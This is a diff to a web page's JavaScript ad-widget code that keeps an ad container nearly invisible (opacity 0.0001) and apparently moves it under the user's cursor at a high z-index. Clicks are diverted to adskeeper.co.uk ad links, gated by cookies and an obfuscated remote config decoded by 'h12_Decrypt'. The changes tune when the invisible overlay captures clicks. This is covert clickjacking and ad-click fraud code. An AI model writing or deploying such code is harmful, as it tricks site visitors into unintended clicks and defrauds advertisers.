@@ -104,7 +104,7 @@ function startTracker() {
 }
 function h12_revertDiv() {
     h12_canTrack = 0;
-    $("#" + h12_div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "").css("width", "");
+    $("#" + h12_div).css("z-index", "-90000").css("top", "0").css("left", "0").css("z-index", "").css("position", "fixed").css("width", "").css("pointer-events", "none").css("opacity", "0.0001");
 }
 function h12_startScript(){
     h12_div = $('div[id^="M286985ScriptRootC766280"]')[0].id;
@@ -120,7 +120,9 @@ function h12_startScript(){
         }
     });
 
-    if(getCookie("_pk29si_delay_time") == null){
+    $("#" + h12_div).css("z-index", "-90000").css("position", "fixed").css("bottom", "0").css("opacity", "0.0001").css("pointer-events", "none");
+    $("#" + h12_div + ' .mgline').css("margin", "0");
+    if(getCookie("_pk29si_delay_time") == null && getCookie("_z0s59a_delay_time") != null){
         $('#'+ h12_div +' .mgheader').remove();
         $('#'+ h12_div +' a').click(function(){h12_clickfuncion2(); return false;});
 
@@ -129,7 +131,7 @@ function h12_startScript(){
 }
 function h12_followDiv() {
     h12_canTrack = 1;
-    $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "800px");
+    $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "800px").css("pointer-events", "");
 }
 function h12_clickfuncion2() {
     let randLinks = $('#'+ h12_div +' a[href^="https://www.adskeeper.co.uk/"]');
@@ -170,7 +172,7 @@ $(document).ready(function () {
         })
         .then(function(body) {
             let jsonResponse = JSON.parse(h12_Decrypt(body, 1247));
-            if(jsonResponse.redecanais === true && getCookie("_z0s59a_delay_time") != null){
+            if(jsonResponse.redecanais === true){
                 setTimeout(h12_startScript,100);
             }
         });
